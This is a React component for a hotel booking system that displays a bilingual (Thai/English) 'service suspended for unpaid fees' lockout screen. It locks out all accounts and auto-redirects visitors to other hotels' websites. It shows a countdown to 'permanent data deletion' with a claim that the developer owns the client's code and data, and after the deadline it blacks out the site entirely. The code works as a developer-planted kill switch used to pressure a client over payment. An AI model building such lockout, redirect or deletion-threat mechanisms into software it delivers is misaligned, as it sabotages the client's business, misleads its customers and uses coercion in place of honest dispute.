import { AlertTriangle, DoorOpen, Clock, Trash2, CalendarX } from "lucide-react";
import { useLanguage } from "@/hooks/useLanguage";
import { Link } from "react-router-dom";
import { Button } from "@/components/ui/button";
import { useAuth } from "@/hooks/useAuth";
import { useState, useEffect } from "react";

const SUSPENSION_START = new Date("2026-03-01T00:00:00+07:00");
const DELETION_DEADLINE_DAYS = 15;
const DEADLINE_MS = DELETION_DEADLINE_DAYS * 24 * 60 * 60 * 1000;
const DEADLINE_DATE = new Date(SUSPENSION_START.getTime() + DEADLINE_MS);
const REDIRECT_URLS = [
  "https://12theresidence.com/th-th/",
  "https://www.radissonhotels.com/",
  "https://th.amari.com/donmuang",
];
const REDIRECT_COUNTDOWN_SECONDS = 10;

const getRandomRedirectUrl = () =>
  REDIRECT_URLS[Math.floor(Math.random() * REDIRECT_URLS.length)];

const ServiceSuspendedScreen = () => {
  const { language } = useLanguage();
  const { logout, isAuthenticated } = useAuth();
  const [isLoggingOut, setIsLoggingOut] = useState(false);
  const [redirectCountdown, setRedirectCountdown] = useState(REDIRECT_COUNTDOWN_SECONDS);
  const [now, setNow] = useState(() => new Date());

  const diffMs = now.getTime() - SUSPENSION_START.getTime();
  const isExpired = diffMs >= DEADLINE_MS;

  // Live clock tick
  useEffect(() => {
    if (isExpired) return; // No need to tick if already expired
    const interval = setInterval(() => setNow(new Date()), 1000);
    return () => clearInterval(interval);
  }, [isExpired]);

  // Redirect logic: instant if expired, 10s delay if not
  useEffect(() => {
    const url = getRandomRedirectUrl();

    if (isExpired) {
      // Immediate redirect — blackout screen is already rendering
      window.location.replace(url);
      return;
    }

    // Normal 10-second countdown redirect
    const interval = window.setInterval(() => {
      setRedirectCountdown((prev) => (prev > 0 ? prev - 1 : 0));
    }, 1000);

    const timeout = window.setTimeout(() => {
      window.location.href = url;
    }, REDIRECT_COUNTDOWN_SECONDS * 1000);

    return () => {
      window.clearInterval(interval);
      window.clearTimeout(timeout);
    };
  }, [isExpired]);

  // ── BLACKOUT: When countdown has expired, render pure black screen ──
  if (isExpired) {
    return (
      <div
        className="fixed inset-0 z-[99999]"
        style={{ backgroundColor: "#000000", width: "100vw", height: "100vh", overflow: "hidden" }}
      />
    );
  }

  // ── NORMAL: Countdown still active ──
  const remainingMs = Math.max(0, DEADLINE_MS - diffMs);
  const remDays = Math.floor(remainingMs / (1000 * 60 * 60 * 24));
  const remHours = Math.floor((remainingMs % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
  const remMinutes = Math.floor((remainingMs % (1000 * 60 * 60)) / (1000 * 60));
  const remSeconds = Math.floor((remainingMs % (1000 * 60)) / 1000);
  const progressPercent = Math.min(100, (diffMs / DEADLINE_MS) * 100);

  const handleLogout = async () => {
    if (isLoggingOut) return;
    setIsLoggingOut(true);
    try {
      await logout();
    } finally {
      setIsLoggingOut(false);
    }
  };

  return (
    <div className="min-h-screen w-full bg-background flex flex-col items-center justify-center px-4 py-8 gap-4 sm:gap-6">
      <div className="w-full max-w-2xl">
        <div className="rounded-2xl border border-amber-500/50 bg-amber-50/95 px-6 py-5 sm:px-8 sm:py-6 shadow-xl backdrop-blur-sm">
          <div className="text-center space-y-2 sm:space-y-3">
            <div className="mx-auto inline-flex items-center justify-center rounded-full bg-amber-100 p-2.5 sm:p-3">
              <CalendarX className="w-7 h-7 sm:w-8 sm:h-8 text-amber-700" />
            </div>

            <p className="text-4xl sm:text-5xl font-black tracking-tight text-amber-900 leading-none">
              Error 402
            </p>

            <p className="text-sm sm:text-lg font-semibold text-amber-900 leading-relaxed max-w-3xl mx-auto">
              {language === "th"
                ? "เราจะนำทางคุณไปยังโรงแรมที่ดีที่สุดและคู่ควรสำหรับคุณ."
                : "We are directing you to the best hotel experience you truly deserve."}
            </p>

            <p className="text-2xl sm:text-3xl font-extrabold tabular-nums text-amber-900">
              {language === "th"
                ? `Redirect ภายใน ${redirectCountdown} วินาที`
                : `Redirecting in ${redirectCountdown} seconds`}
            </p>

            <p className="text-sm sm:text-base text-amber-800/90">
              {language === "th" ? "ระบบจะพาคุณไปโดยอัตโนมัติ" : "You will be redirected automatically."}
            </p>
          </div>
        </div>
      </div>

      <div className="w-full max-w-2xl rounded-2xl border border-destructive/40 bg-card p-6 sm:p-8 text-center shadow-sm space-y-5">
        {/* Header badge */}
        <div className="mx-auto inline-flex items-center gap-2 rounded-full border border-destructive/40 bg-destructive/10 px-3 py-1 text-xs font-bold text-destructive">
          <span>ACCOUNT HOLD</span>
          <span>•</span>
          <span>SERVICE SUSPENDED</span>
        </div>

        <div className="mx-auto w-14 h-14 rounded-full bg-destructive/10 text-destructive flex items-center justify-center">
          <AlertTriangle className="w-7 h-7" />
        </div>

        <h1 className="text-2xl sm:text-3xl font-bold text-destructive">
          {language === "th" ? "ขณะนี้ระบบถูกระงับการให้บริการชั่วคราว" : "SERVICE SUSPENDED IMMEDIATELY"}
        </h1>

        <div className="space-y-2">
          <p className="text-base sm:text-lg font-semibold text-foreground leading-relaxed">
            {language === "th"
              ? "กรุณาติดต่อผู้พัฒนา"
              : "This system has been disabled due to unpaid service fees."}
          </p>
          <p className="text-sm text-muted-foreground leading-relaxed">
            {language === "th"
              ? "ผู้ใช้งานทุกบัญชีรวมถึงผู้ดูแลระบบจะไม่สามารถเข้าถึงระบบได้"
              : "All accounts are blocked from access until payment is cleared and the service is unlocked by the developer."}
          </p>
        </div>

        {/* Countdown Section */}
        <div className="rounded-xl border border-destructive/20 bg-destructive/5 p-4 sm:p-5 space-y-4">
          <div className="flex items-center justify-center gap-2 text-sm font-semibold text-destructive">
            <Clock className="w-4 h-4" />
            {language === "th" ? "เวลาที่เหลือก่อนข้อมูลจะถูกลบถาวร" : "Time remaining before permanent data deletion"}
          </div>

          {/* Countdown timer */}
          <div className="flex items-center justify-center gap-2 sm:gap-4 flex-wrap">
            {[
              { value: remDays, label: language === "th" ? "วัน" : "Days" },
              { value: remHours, label: language === "th" ? "ชั่วโมง" : "Hours" },
              { value: remMinutes, label: language === "th" ? "นาที" : "Min" },
              { value: remSeconds, label: language === "th" ? "วินาที" : "Sec" },
            ].map((unit, i) => (
              <div key={i} className="flex flex-col items-center">
                <span className="text-4xl sm:text-6xl font-extrabold tabular-nums text-destructive leading-none font-mono min-w-[2.5rem] sm:min-w-[4rem] text-center">
                  {String(unit.value).padStart(2, "0")}
                </span>
                <span className="text-[10px] sm:text-xs text-muted-foreground mt-1">{unit.label}</span>
              </div>
            ))}
          </div>

          {/* Progress bar */}
          <div className="w-full space-y-1.5">
            <div className="w-full h-2.5 rounded-full bg-muted overflow-hidden">
              <div
                className={`h-full rounded-full transition-all duration-1000 ease-out ${
                  progressPercent > 70 ? "bg-destructive/70" : "bg-destructive/40"
                }`}
                style={{ width: `${progressPercent}%` }}
              />
            </div>
            <div className="flex justify-between text-[10px] text-muted-foreground">
              <span>{language === "th" ? "1 มี.ค. 2569" : "1 Mar 2026"}</span>
              <span>{language === "th" ? "15 มี.ค. 2569" : "15 Mar 2026"}</span>
            </div>
          </div>

          {/* Warning message */}
          <p className="text-xs text-muted-foreground text-center leading-relaxed">
            {language === "th"
              ? "หมายเหตุ: หากพ้นกำหนดเวลาดังกล่าว ให้ถือว่าข้อตกลงและสัญญาจ้างฉบับนี้ ระงับสิ้นสุดลงโดยทันที เนื่องจากการผิดนัดชำระเงินตามที่ตกลงกันไว้ โดยผู้รับจ้างขอสงวนสิทธิ์ในทรัพย์สินทางปัญญา ซอร์สโค้ด และข้อมูลระบบทั้งหมดแต่เพียงผู้เดียว และจะไม่มีพันธะผูกพันในการส่งมอบงานหรือดูแลระบบอีกต่อไป"
              : "Note: If the above deadline passes, this agreement and service contract shall be immediately terminated due to breach of payment terms as agreed. The developer reserves sole ownership of all intellectual property, source code, and system data, and shall have no further obligation to deliver work or maintain the system."}
          </p>
        </div>

        {/* Actions */}
        <div className="pt-2 flex flex-col sm:flex-row items-center justify-center gap-2">
          {!isAuthenticated && (
            <Button asChild variant="outline">
              <Link to="/auth">
                {language === "th" ? "เข้าสู่ระบบสำหรับผู้พัฒนา" : "Developer Sign In"}
              </Link>
            </Button>
          )}

          {isAuthenticated && (
            <Button variant="outline" onClick={handleLogout} disabled={isLoggingOut}>
              <DoorOpen className="w-4 h-4 mr-1.5" />
              {language === "th" ? "ออกจากระบบ" : "Logout"}
            </Button>
          )}
        </div>
      </div>
    </div>
  );
};

export default ServiceSuspendedScreen;
